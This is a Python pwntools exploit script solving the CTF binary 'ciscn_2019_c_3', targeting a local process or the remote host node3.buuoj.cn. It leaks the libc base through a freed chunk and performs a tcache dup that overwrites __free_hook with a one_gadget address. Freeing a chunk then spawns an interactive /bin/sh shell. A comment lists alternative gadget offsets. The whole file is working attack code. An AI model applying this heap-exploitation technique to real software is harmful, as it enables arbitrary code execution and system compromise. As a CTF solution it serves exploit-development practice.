#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./ciscn_2019_c_3')
	elf = ELF('./ciscn_2019_c_3',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

else:
	p = remote('node3.buuoj.cn',26725)
	elf = ELF('./ciscn_2019_c_3',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def menu(cmd):
    sla("Command: \n",str(cmd))

def create(size,content):
    menu(1)
    sla('size: ',str(size))
    if(len(content)==size):
        sda('name: \n',content)
    else:
        sla('name: \n',content)

def show(idx):
    menu(2)
    sla('index: \n',str(idx))

def delete(idx):
    menu(3)
    sla('weapon:\n',str(idx))

def backdoor(idx):
    menu(666)
    sla('weapon:',str(idx))


###leak libc###
create(0x100,'leak libc')#0
create(0x60,'make a fake chunk')#1
create(0x60,'/bin/sh\x00')#2

for i in range(8):
    delete(0)

show(0)
ru('attack_times: ')
libc_base = int(rv(16)) - 96 - 0x3ebc40

success('libc base:'+hex(libc_base))
pause()
###tcache dup###
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
one_gadget = libc_base + 0x4f322

delete(1)
create(0x60,p64(0)+p64(0)+p64(free_hook-0x10))#1
delete(1)
delete(2)

for i in range(0x20):
    backdoor(2)


create(0x60,'/bin/sh\x00')
create(0x60,'/bin/sh\x00')
create(0x60,p64(one_gadget))

###get shell###
delete(0)
ia()

'''
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''